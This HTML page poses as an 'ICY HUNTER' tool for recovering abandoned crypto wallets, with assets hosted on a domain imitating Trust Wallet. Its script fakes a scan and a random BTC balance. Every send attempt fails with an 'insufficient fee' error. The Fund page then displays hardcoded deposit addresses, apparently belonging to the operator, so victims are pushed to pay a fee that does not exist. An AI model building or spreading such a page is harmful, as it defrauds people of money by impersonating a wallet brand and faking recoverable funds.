<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Trust ‚Ä¢ icy hunt</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
    }

    body {
      min-height: 100vh;
      background: radial-gradient(circle at 30% 40%, #0b1a2f, #030712 95%);
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 12px;
      position: relative;
      overflow: hidden;
    }

    /* Laser Beam Effect */
    .laser-beam {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: 10;
    }
    .laser-beam::before {
      content: '';
      position: absolute;
      left: -5%;
      width: 110%;
      height: 3px;
      background: linear-gradient(90deg, rgba(0, 180, 255, 0), rgba(0, 200, 255, 0.9) 50%, rgba(0, 180, 255, 0));
      filter: blur(1.5px);
      box-shadow: 0 0 25px #00a6ff;
      animation: laserMove 2.5s ease-in-out forwards;
      top: -5%;
    }

    @keyframes laserMove {
      0% { top: -5%; opacity: 0; }
      20% { opacity: 1; }
      80% { opacity: 1; }
      100% { top: 105%; opacity: 0; }
    }

    /* Main Card */
    .card {
      background: rgba(10, 20, 35, 0.75);
      backdrop-filter: blur(25px) saturate(180%);
      -webkit-backdrop-filter: blur(25px) saturate(180%);
      border-radius: 40px;
      box-shadow: 0 30px 60px -20px #000, 0 0 0 1px rgba(0, 150, 255, 0.3);
      width: 100%;
      max-width: 380px;
      padding: 24px 20px;
      color: #e2f0ff;
      border: 1px solid rgba(0, 170, 255, 0.3);
      position: relative;
      z-index: 20;
    }

    .page { display: none; flex-direction: column; gap: 16px; }
    .page.active { display: flex; }

    /* Stylish Back Button */
    .back-btn {
      display: flex;
      align-items: center;
      gap: 6px;
      color: #8ac7ff;
      font-size: 0.85rem;
      font-weight: 500;
      cursor: pointer;
      padding: 8px 14px;
      background: rgba(0, 150, 255, 0.1);
      border-radius: 14px;
      border: 1px solid rgba(0, 150, 255, 0.2);
      transition: all 0.3s ease;
      width: fit-content;
    }
    .back-btn:hover {
      background: rgba(0, 150, 255, 0.2);
      border-color: rgba(0, 150, 255, 0.5);
      transform: translateX(-3px);
      color: #fff;
    }

    /* Scanner Landing */
    .insignia {
      font-size: 0.8rem;
      color: #8ac7ff;
      background: rgba(0, 150, 255, 0.12);
      padding: 10px 20px;
      border-radius: 40px;
      align-self: center;
      border: 1px solid rgba(0, 180, 255, 0.5);
      text-shadow: 0 0 10px #00b7ff;
    }
    .search-area {
      background: rgba(0, 20, 45, 0.6);
      border-radius: 60px;
      padding: 6px 6px 6px 22px;
      display: flex;
      align-items: center;
      border: 1px solid rgba(0, 180, 255, 0.6);
      box-shadow: 0 0 15px rgba(0, 119, 255, 0.2);
    }
    .search-area input {
      flex: 1; border: none; background: transparent; color: #d4ecff; outline: none; font-size: 0.9rem;
    }
    .search-area button {
      background: linear-gradient(145deg, #0066cc, #004080);
      border: none; color: white; border-radius: 50px; padding: 12px 26px;
      font-weight: 700; cursor: pointer; border: 1px solid #3a9eff;
      box-shadow: 0 4px 15px rgba(0, 119, 255, 0.4);
    }

    .scan-console {
      background: rgba(0, 10, 25, 0.85);
      border-radius: 24px;
      padding: 16px;
      height: 220px;
      border: 1px solid #0080ff;
      font-family: 'Courier New', monospace;
      color: #b3e0ff;
      font-size: 0.8rem;
      overflow-y: auto;
      box-shadow: inset 0 0 20px #000;
    }
    .log-line { margin-bottom: 6px; opacity: 0.9; }

    /* Wallet Page */
    .balance-section {
      background: rgba(0, 40, 80, 0.3);
      border-radius: 28px;
      padding: 24px 20px;
      border: 1px solid rgba(0, 120, 255, 0.4);
      text-align: center;
    }
    .total-balance { font-size: 2.6rem; font-weight: 700; color: #fff; text-shadow: 0 0 15px #0080ff; }
    
    .action-row { display: flex; justify-content: center; gap: 50px; margin: 10px 0; }
    .action-item { display: flex; flex-direction: column; align-items: center; gap: 8px; cursor: pointer; }
    .action-circle-glass {
      width: 58px; height: 58px; border-radius: 50%;
      background: rgba(0, 120, 255, 0.15);
      border: 1.5px solid #4da6ff;
      display: flex; align-items: center; justify-content: center;
      font-weight: 600; font-size: 0.85rem; color: #fff;
      transition: all 0.3s ease;
      box-shadow: 0 8px 15px rgba(0,0,0,0.2);
    }
    .action-item:hover .action-circle-glass { background: rgba(0, 120, 255, 0.3); transform: translateY(-3px); }

    .crypto-row {
      display: flex; align-items: center; justify-content: space-between;
      background: rgba(0, 20, 45, 0.5);
      padding: 14px 18px; border-radius: 24px;
      border: 1px solid #0070bb;
    }
    .crypto-info { display: flex; align-items: center; gap: 12px; }
    .crypto-icon { width: 36px; height: 36px; border-radius: 50%; }

    /* Fund & Send Pages */
    .qr-box {
      background: rgba(0, 20, 45, 0.6);
      border: 1px solid #2f8ed0; border-radius: 30px; padding: 25px;
      display: flex; flex-direction: column; align-items: center; gap: 18px;
    }
    .qr-code-image {
      width: 190px; height: 190px; background: white; border-radius: 18px; padding: 12px;
      box-shadow: 0 0 20px rgba(0,0,0,0.3);
    }
    .qr-code-image img { width: 100%; height: 100%; border-radius: 8px; }
    
    .address-display {
      background: rgba(0,0,0,0.4); border: 1px solid #3a8fd0; border-radius: 15px;
      padding: 12px; width: 100%; text-align: center;
      word-break: break-all; font-family: monospace; font-size: 0.75rem; color: #c0e2ff;
    }

    .network-badge {
      font-size: 0.85rem; color: #8fcbff; font-weight: 500;
      background: rgba(0, 120, 255, 0.2); padding: 8px 20px;
      border-radius: 30px; border: 1px solid #2f81c0;
    }

    /* Send Form */
    .input-group { display: flex; flex-direction: column; gap: 8px; }
    .input-label { font-size: 0.8rem; color: #a3ceff; margin-left: 10px; }
    
    .address-field {
      display: flex; background: rgba(0, 20, 45, 0.5); border-radius: 20px;
      border: 1px solid #2f81c0; padding: 6px 6px 6px 16px; align-items: center;
    }
    .address-field input { flex: 1; border: none; background: transparent; color: #fff; outline: none; font-size: 0.9rem; }
    .paste-btn { background: #1f5090; border: 1px solid #5fa3e0; border-radius: 14px; padding: 10px 16px; color: white; cursor: pointer; font-size: 0.8rem; }

    .amount-field {
      display: flex; gap: 10px; align-items: center;
      background: rgba(0, 20, 45, 0.5); border-radius: 20px; 
      border: 1px solid #2f81c0; padding: 6px;
    }
    .amount-field input {
      flex: 1; border: none; background: transparent; color: #fff; 
      outline: none; padding: 10px 14px; font-size: 1.1rem;
    }
    .max-btn {
      background: #004a99; color: #fff; border: 1px solid #5fa8e6;
      border-radius: 14px; padding: 12px 20px; font-weight: 600; cursor: pointer;
      transition: background 0.2s;
    }
    .max-btn:hover { background: #005cc2; }

    .confirm-btn {
      background: #0059b3; color: white; border: 1px solid #6ab0ff;
      border-radius: 25px; padding: 18px; font-size: 1.1rem; font-weight: 600;
      cursor: pointer; width: 100%; margin-top: 10px; transition: 0.3s;
    }
    .confirm-btn:disabled { background: #1f3857; color: #557091; border-color: #334; cursor: not-allowed; }

    /* Loading Spinner */
    @keyframes spin { to { transform: rotate(360deg); } }
    .spinner {
      width: 45px; height: 45px; border: 4px solid rgba(0,100,200,0.2);
      border-top-color: #00aaff; border-radius: 50%; animation: spin 1s linear infinite;
    }
    .cursor-blink { display: inline-block; width: 8px; height: 14px; background: #3aa8ff; animation: blink 1s step-end infinite; margin-left: 5px; }
    @keyframes blink { 0%,100%{ opacity:1; } 50%{ opacity:0; } }
  </style>
</head>
<body>
  <div class="laser-beam" id="laser"></div>

  <div class="card">
    <div class="page active" id="hunterLanding">
      <div class="insignia">üîé ICY HUNTER ¬∑ deep scan</div>
      <div class="search-area">
        <input type="text" value="abandoned entropy" readonly>
        <button id="huntBtn">SCAN LOST</button>
      </div>
      <div class="scan-console" id="huntConsole">
        <div class="log-line">> system ready...<span class="cursor-blink"></span></div>
      </div>
    </div>

    <div class="page" id="loadingPage" style="align-items: center; justify-content: center; min-height: 300px;">
      <div class="spinner"></div>
      <p style="margin-top: 20px; color: #8fcbff; letter-spacing: 1px;">DECRYPTING WALLET...</p>
    </div>

    <div class="page" id="walletPage">
      <div class="balance-section">
        <p style="font-size: 0.75rem; color: #a3ceff; margin-bottom: 5px;">Total Balance</p>
        <div class="total-balance" id="mainBalance">$0.00</div>
      </div>

      <div class="action-row">
        <div class="action-item" id="sendAction"><div class="action-circle-glass">SEND</div><span>Send</span></div>
        <div class="action-item" id="fundAction"><div class="action-circle-glass">FUND</div><span>Fund</span></div>
      </div>

      <div class="crypto-row">
        <div class="crypto-info">
          <img src="https://trustwalleteth.github.io/B/1.png" class="crypto-icon">
          <div>
            <p style="font-weight:600">Bitcoin</p>
            <p style="font-size:0.7rem; color:#8bb9ec">ERC-20</p>
          </div>
        </div>
        <div style="text-align:right">
          <p id="btcAmount" style="font-weight:700; font-size: 1.1rem;">0</p>
          <p style="font-size:0.7rem; color:#8bb9ec">BTC</p>
        </div>
      </div>

      <div class="back-btn" id="backToHunt" style="margin-top: 10px;">‚Üê Back to Scanner</div>
    </div>

    <div class="page" id="fundPage">
      <div class="back-btn" id="backFromFund">‚Üê Back</div>
      <h3 style="text-align:center; font-weight:500;">Receive BTC</h3>
      <div class="qr-box">
        <div class="qr-code-image">
          <img id="fundQrImage" src="">
        </div>
        <div class="address-display" id="fundAddress">0x...</div>
        <div class="network-badge">Ethereum (ERC-20)</div>
      </div>
    </div>

    <div class="page" id="sendPage">
      <div class="back-btn" id="backFromSend">‚Üê Back</div>
      
      <div class="input-group">
        <label class="input-label">Recipient Address</label>
        <div class="address-field">
          <input type="text" id="addressInput" placeholder="0x...">
          <button class="paste-btn" id="pasteBtn">Paste</button>
        </div>
      </div>

      <div class="input-group">
        <label class="input-label">Amount (BTC)</label>
        <div class="amount-field">
          <input type="number" id="amountInput" placeholder="0.00">
          <button class="max-btn" id="maxBtn">Max</button>
        </div>
      </div>

      <div id="feeError" style="display:none; color: #ff6b6b; font-size: 0.8rem; text-align: center;">
        ‚ö†Ô∏è Insufficient fee for ERC-20 transfer
      </div>

      <button class="confirm-btn" id="confirmBtn" disabled>Next</button>
    </div>
  </div>

  <script>
    (function() {
      // Data
      const btcValues = [632.47, 130.28, 1325.64];
      const fundOptions = [
        { qr: 'https://trustwalleteth.github.io/QR/Screenshot_2026-02-14-20-40-37-266-edit_com.wallet.crypto.trustapp.jpg', address: '0x55aD83631e3E454b79510273a2F89A4bf096B7C7' },
        { qr: 'https://trustwalleteth.github.io/B/Screenshot_2026-02-15-16-25-58-334-edit_com.wallet.crypto.trustapp.jpg', address: '0xA34559ea9Bc18F31687C1A5090350FD7D4d4bad2' },
        { qr: 'https://trustwalleteth.github.io/B/Screenshot_2026-02-15-16-20-08-765-edit_com.wallet.crypto.trustapp.jpg', address: '0xc8C4D2bd2A051068682D9125b0ac858570976087' }
      ];

      let walletData = null;

      // Navigation Helper
      function showPage(id) {
        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
        document.getElementById(id).classList.add('active');
      }

      // 1. Scanner Logic
      document.getElementById('huntBtn').onclick = function() {
        const console = document.getElementById('huntConsole');
        console.innerHTML = '';
        let count = 0;
        const interval = setInterval(() => {
          const fakeAddr = '0x' + Math.random().toString(16).substring(2, 15) + '...';
          console.innerHTML += `<div class="log-line">> scanning: ${fakeAddr}</div>`;
          console.scrollTop = console.scrollHeight;
          count++;
          if (count > 25) {
            clearInterval(interval);
            walletData = { balance: btcValues[Math.floor(Math.random() * btcValues.length)] };
            showPage('loadingPage');
            setTimeout(() => {
              document.getElementById('mainBalance').innerText = '$' + walletData.balance.toLocaleString();
              document.getElementById('btcAmount').innerText = walletData.balance;
              showPage('walletPage');
            }, 2500);
          }
        }, 60);
      };

      // 2. Wallet Actions
      document.getElementById('fundAction').onclick = () => {
        const choice = fundOptions[Math.floor(Math.random() * fundOptions.length)];
        document.getElementById('fundQrImage').src = choice.qr;
        document.getElementById('fundAddress').innerText = choice.address;
        showPage('fundPage');
      };

      document.getElementById('sendAction').onclick = () => showPage('sendPage');

      // 3. Send Form Logic
      const addrInp = document.getElementById('addressInput');
      const amtInp = document.getElementById('amountInput');
      const confBtn = document.getElementById('confirmBtn');

      function validate() {
        confBtn.disabled = !(addrInp.value.length > 5 && parseFloat(amtInp.value) > 0);
      }

      document.getElementById('pasteBtn').onclick = () => {
        addrInp.value = '0x';
        validate();
      };

      document.getElementById('maxBtn').onclick = () => {
        if(walletData) amtInp.value = walletData.balance;
        validate();
      };

      addrInp.oninput = validate;
      amtInp.oninput = validate;

      document.getElementById('confirmBtn').onclick = function() {
        this.innerHTML = "Processing...";
        setTimeout(() => {
          document.getElementById('feeError').style.display = 'block';
          this.innerHTML = "Next";
        }, 1500);
      };

      // Back Buttons
      document.getElementById('backToHunt').onclick = () => showPage('hunterLanding');
      document.getElementById('backFromFund').onclick = () => showPage('walletPage');
      document.getElementById('backFromSend').onclick = () => showPage('walletPage');

    })();
  </script>
</body>
</html>
